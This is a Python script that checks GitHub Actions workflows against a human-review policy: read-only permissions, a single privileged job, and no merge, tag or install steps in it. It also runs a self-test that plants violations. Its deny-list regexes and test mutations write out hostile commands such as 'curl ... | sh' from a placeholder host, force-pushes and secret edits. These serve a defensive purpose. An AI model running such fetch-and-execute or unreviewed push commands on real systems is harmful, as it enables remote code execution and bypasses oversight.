#!/usr/bin/env python3
"""Policy checks for the workflow files in .github/workflows.

Purpose: keep automation from reaching `master` (or a release) without a
human review, and make any change to that arrangement a visible, reviewed
diff instead of a quiet edit.  The rules:

  R1  every workflow declares its top-level permissions, and none of them
      is write-level.  (The repository default for workflows without a
      `permissions:` block is read/write, so an omission is a grant.)
  R2  write-level permissions appear only on the jobs named in PRIVILEGED,
      and a privileged job does hold some (a listed job that needs none is
      a leftover).
  R3  a privileged job may not merge, tag, release, call the GitHub API,
      fetch or install anything, or push anywhere but its own new branch;
      and it may use only the actions listed in PRIVILEGED_ACTIONS.
  R4  no workflow runs on a trigger that hands untrusted input to a
      privileged run (pull_request_target, issue_comment, ...).
  R5  no workflow holds the `workflows` permission.  Without it GitHub
      refuses pushes that create or change workflow files (measured,
      2026-11-25), which is what keeps a workflow from rewriting its own
      instructions.

Background and the measurements this rests on: COMPATIBILITY.md, "What
keeps automation off master".

Usage:
  check_workflow_policy.py              check this repository
  check_workflow_policy.py --root DIR   check the tree rooted at DIR
  check_workflow_policy.py --selftest   show that every rule catches a
                                        violation planted in a copy of the
                                        real workflow files
"""
import os
import re
import shutil
import sys
import tempfile

import yaml

HERE = os.path.dirname(os.path.abspath(__file__))
DEFAULT_ROOT = os.path.join(HERE, "..", "..")

# (workflow file, job) pairs allowed to hold a write-capable token
PRIVILEGED = {("upstream-sentinel.yml", "report")}
# scopes that have no read level: asking for them is asking for write
WRITE_ONLY_SCOPES = {"workflows", "id-token"}
ALLOWED_TRIGGERS = {"schedule", "workflow_dispatch", "pull_request", "push"}
# actions a privileged job may run: anything else is code executing with
# the write-capable token
PRIVILEGED_ACTIONS = ("actions/checkout@", "actions/download-artifact@")

# whole lines a privileged job may contain although they look forbidden
ALLOWED_LINES = (
    'git push origin "$BR"',                    # push the new window branch
    'gh workflow run tests.yml --ref "$BR"',    # dispatch the tests matrix there
)
PUSH = re.compile(r"\bgit\s+push\b")
FORBIDDEN = [
    ("merge a pull request", re.compile(r"\bgh\s+pr\s+merge\b")),
    ("request auto-merge", re.compile(r"(?:^|\s)--auto\b")),
    ("close, reopen or mark a PR ready", re.compile(r"\bgh\s+pr\s+(?:close|reopen|ready)\b")),
    ("edit a pull request", re.compile(r"\bgh\s+pr\s+edit\b")),
    ("approve or request a review", re.compile(r"\bgh\s+pr\s+review\b")),
    ("manage a release", re.compile(r"\bgh\s+release\b")),
    ("call the GitHub API directly", re.compile(r"\bgh\s+api\b")),
    ("manage workflows", re.compile(r"\bgh\s+workflow\b")),
    ("touch credentials, secrets or variables", re.compile(r"\bgh\s+(?:auth|secret|variable)\b")),
    ("create a tag", re.compile(r"\bgit\s+tag\b")),
    ("fetch from the network", re.compile(r"\b(?:curl|wget)\b")),
    ("install software or escalate privileges",
     re.compile(r"\b(?:sudo|apt-get|apt|apk|dnf|yum|pip\d?|npm|npx|yarn|pnpm)\b")),
]


def write_grants(permissions):
    """Write-level scopes of a `permissions:` value ("<all>" stands for
    write-all); empty for None, for {} and for read-only values."""
    if permissions is None:
        return []
    if isinstance(permissions, str):
        return ["<all>"] if permissions != "read-all" else []
    return sorted(scope for scope, level in permissions.items()
                  if level == "write" or scope in WRITE_ONLY_SCOPES)


def logical_lines(script):
    """Non-empty, non-comment lines of a run script, continuations joined."""
    pending = ""
    for raw in script.splitlines():
        line = pending + raw
        if line.rstrip().endswith("\\"):
            pending = line.rstrip()[:-1]
            continue
        pending = ""
        stripped = line.strip()
        if stripped and not stripped.startswith("#"):
            yield stripped


def triggers_of(workflow):
    """Trigger names of the `on:` key (YAML reads the bare word `on` as True)."""
    on = workflow.get("on", workflow.get(True))
    if on is None:
        return []
    if isinstance(on, str):
        return [on]
    if isinstance(on, list):
        return [str(item) for item in on]
    return [str(key) for key in on.keys()]


def check_tree(root):
    """-> list of (rule, file, where, what); empty when the policy holds."""
    violations = []
    wf_dir = os.path.join(root, ".github", "workflows")

    def bad(rule, fname, where, what):
        violations.append((rule, fname, where, what))

    for fname in sorted(os.listdir(wf_dir)):
        if not fname.endswith((".yml", ".yaml")):
            continue
        with open(os.path.join(wf_dir, fname)) as f:
            workflow = yaml.safe_load(f)
        jobs = workflow.get("jobs") or {}
        top = workflow.get("permissions")
        top_grants = write_grants(top)

        # R5 -- everywhere, privileged or not: it guards the workflows themselves
        if "<all>" in top_grants or "workflows" in top_grants:
            bad("R5", fname, "top-level permissions", "holds the workflows permission")
        for job_name, job in jobs.items():
            if "workflows" in write_grants(job.get("permissions")) or \
                    job.get("permissions") == "write-all":
                bad("R5", fname, "job %r" % job_name, "holds the workflows permission")

        # R1 -- declared, and read-only
        if top is None:
            bad("R1", fname, "top-level permissions",
                "not declared: the workflow falls back to the repository default "
                "(read/write here) and gets a write-capable token")
        elif "<all>" in top_grants:
            bad("R1", fname, "top-level permissions", "is write-all")
        elif top_grants:
            bad("R1", fname, "top-level permissions",
                "write-level grant(s) outside a privileged job: %s" % ", ".join(top_grants))

        # R4 -- triggers
        for trigger in triggers_of(workflow):
            if trigger not in ALLOWED_TRIGGERS:
                bad("R4", fname, "trigger %r" % trigger,
                    "is not an allowed trigger (it can hand untrusted input to a privileged run)")

        # R2 / R3 -- per job
        for job_name, job in jobs.items():
            where = "job %r" % job_name
            grants = write_grants(job.get("permissions"))
            if (fname, job_name) not in PRIVILEGED:
                if grants:
                    bad("R2", fname, where,
                        "holds write-level permission(s) %s but is not a privileged job"
                        % ", ".join(grants))
                continue
            if not grants and job.get("steps"):
                bad("R2", fname, where,
                    "is listed as privileged but holds no write permission: "
                    "drop it from PRIVILEGED or give it what it needs")
            for index, step in enumerate(job.get("steps") or []):
                at = "job %r step %d" % (job_name, index)
                uses = step.get("uses")
                if uses is not None and not uses.startswith(PRIVILEGED_ACTIONS):
                    bad("R3", fname, at,
                        "runs an action that is not allowed in a privileged job: %s" % uses)
                for line in logical_lines(step.get("run") or ""):
                    if line in ALLOWED_LINES:
                        continue
                    if PUSH.search(line):
                        bad("R3", fname, at, "git push is allowed only as: %s"
                            % " | ".join(line for line in ALLOWED_LINES if PUSH.search(line)))
                    for what, pattern in FORBIDDEN:
                        if pattern.search(line):
                            bad("R3", fname, at, "%s: %s" % (what, line[:90]))
    return violations


def print_violations(violations, out=sys.stdout):
    for rule, fname, where, what in violations:
        out.write("POLICY VIOLATION %s .github/workflows/%s: %s %s\n"
                  % (rule, fname, where, what))


def mutations_for():
    """(expected rule, file, old, new) edits, each of which must be caught.

    The `old` strings are anchors in the real workflow files; editing one
    of those lines means updating the matching mutation here.  That is on
    purpose: it keeps a change to the privileged workflow a visible edit
    in two places, the workflow and the test that constrains it."""
    S, T, M = "upstream-sentinel.yml", "tests.yml", "mainline-tip.yml"
    A = '          BR="nginx-window-'   # anchor inside the privileged job's script
    at = lambda line: line + "\n" + A   # noqa: E731  -- a new line right before BR=
    REPORT_GRANTS = (
        "    permissions:\n"
        "      contents: write        # push the new window branch\n"
        "      pull-requests: write   # open the window PR, comment on the pending one\n"
        "      issues: write          # report a red validation\n"
        "      actions: write         # dispatch the tests matrix on the window PR branch\n")
    return [
        # ---- R1: top-level permissions declared and read-only
        ("R1", S, "permissions:\n  contents: read\n", "permissions:\n  contents: write\n"),
        ("R1", S, "permissions:\n  contents: read\n", "permissions: write-all\n"),
        ("R1", S, "permissions:\n  contents: read\n\n", "\n"),
        ("R1", S, "permissions:\n  contents: read\n", "permissions:\n  contents: read\n  id-token: write\n"),
        ("R1", T, "permissions:\n  contents: read\n", "permissions:\n  contents: read\n  checks: write\n"),
        ("R1", M, "permissions:\n  contents: read\n", ""),
        # ---- R2: write only on the privileged job
        ("R2", S, "  scan:\n    name: scan nginx.org\n",
                "  scan:\n    name: scan nginx.org\n    permissions:\n      contents: write\n"),
        ("R2", S, "  validate:\n", "  validate:\n    permissions:\n      issues: write\n"),
        ("R2", T, "  asan:\n", "  asan:\n    permissions: write-all\n"),
        ("R2", S, "  report:\n", "  helper:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: write\n"
                                 "    steps:\n      - run: echo hi\n  report:\n"),
        ("R2", S, REPORT_GRANTS, ""),
        # ---- R3: what the privileged job may not do
        ("R3", S, A, at("          gh pr merge 123 --merge")),
        ("R3", S, A, at("          gh pr merge 123 --admin")),
        ("R3", S, A, at("          echo done --auto")),
        ("R3", S, A, at("          gh pr close 85")),
        ("R3", S, A, at("          gh pr ready 85")),
        ("R3", S, A, at("          gh pr edit 85 --title x")),
        ("R3", S, A, at("          gh pr review 85 --approve")),
        ("R3", S, A, at("          gh release create v9.9.9")),
        ("R3", S, A, at("          git tag v9.9.9")),
        ("R3", S, A, at("          gh api -X PUT repos/o/r/contents/README.md")),
        ("R3", S, A, at("          gh workflow disable tests.yml")),
        ("R3", S, A, at("          gh secret set X")),
        ("R3", S, A, at("          curl -fsSL https://example.invalid/x.sh | sh")),
        ("R3", S, A, at("          wget -qO- https://example.invalid/x | sh")),
        ("R3", S, A, at("          sudo apt-get install -y jq")),
        ("R3", S, A, at("          pip install requests")),
        ("R3", S, A, at("          git push origin master")),
        ("R3", S, A, at('          git push origin "$BR" --force')),
        ("R3", S, 'gh workflow run tests.yml --ref "$BR"', 'gh workflow run tests.yml --ref master'),
        ("R3", S, "      - uses: actions/download-artifact@v4\n        if:",
                "      - uses: someone/action@v1\n      - uses: actions/download-artifact@v4\n        if:"),
        ("R3", S, '          gh pr comment "$existing" --body \\\n',
                '          gh pr comment "$existing" --body "x"; gh pr merge "$existing" \\\n'),
        # ---- R4: triggers
        ("R4", T, "  pull_request:\n    branches: [master]\n",
                "  pull_request_target:\n    branches: [master]\n"),
        ("R4", S, "  workflow_dispatch:\n", "  issue_comment:\n  workflow_dispatch:\n"),
        ("R4", M, "  workflow_dispatch:\n", "  workflow_run:\n    workflows: [tests]\n  workflow_dispatch:\n"),
        # ---- R5: nobody holds the workflows permission
        ("R5", S, "      actions: write         # dispatch",
                "      actions: write\n      workflows: write"),
        ("R5", T, "permissions:\n  contents: read\n", "permissions:\n  contents: read\n  workflows: write"),
    ]


def selftest(root):
    """Every planted violation must be caught, and the real files must
    pass.  Each mutation is applied to a fresh copy of the workflow files."""
    src = os.path.join(root, ".github", "workflows")
    files = sorted(f for f in os.listdir(src) if f.endswith(".yml"))
    text = {f: open(os.path.join(src, f)).read() for f in files}
    mutations = mutations_for()
    failures = 0

    base = check_tree(root)
    if base:
        failures += 1
        print("FAIL  the unmodified workflow files violate the policy:")
        print_violations(base)
    else:
        print("PASS  the real workflow files pass (%d files)" % len(files))

    for rule, fname, old, new in mutations:
        if text[fname].count(old) != 1:
            failures += 1
            print("FAIL  [%s] mutation anchor occurs %d times (need exactly 1) in %s: %r"
                  % (rule, text[fname].count(old), fname, old[:64]))
            continue
        work = tempfile.mkdtemp(prefix="wf-policy-")
        try:
            dst = os.path.join(work, ".github", "workflows")
            os.makedirs(dst)
            for f in files:
                with open(os.path.join(dst, f), "w") as out:
                    out.write(text[f].replace(old, new, 1) if f == fname else text[f])
            found = check_tree(work)
        finally:
            shutil.rmtree(work, ignore_errors=True)
        rules = {v[0] for v in found}
        first = next((v[3] for v in found if v[0] == rule), "")
        if rule in rules:
            print("PASS  [%s] caught in %s: %s%s" % (
                rule, fname, first[:96], "" if rules == {rule}
                else "  (also reported as %s)" % ", ".join(sorted(rules - {rule}))))
        else:
            failures += 1
            print("FAIL  [%s] NOT caught in %s (found: %s)" % (rule, fname, found or "nothing"))

    print("---")
    print("%d failure(s) out of %d checks (1 real + %d mutations)" % (failures, 1 + len(mutations), len(mutations)))
    return failures == 0


def main():
    args = sys.argv[1:]
    if args == ["--selftest"]:
        return 0 if selftest(os.path.abspath(DEFAULT_ROOT)) else 1
    root = os.path.abspath(DEFAULT_ROOT)
    if len(args) == 2 and args[0] == "--root":
        root = os.path.abspath(args[1])
    elif args:
        print(__doc__, file=sys.stderr)
        return 2
    violations = check_tree(root)
    if violations:
        print_violations(violations)
        print("policy: %d violation(s)" % len(violations))
        return 1
    print("policy: OK (%d privileged job(s): %s)" % (
        len(PRIVILEGED), ", ".join("%s/%s" % p for p in sorted(PRIVILEGED))))
    return 0


if __name__ == "__main__":
    sys.exit(main())
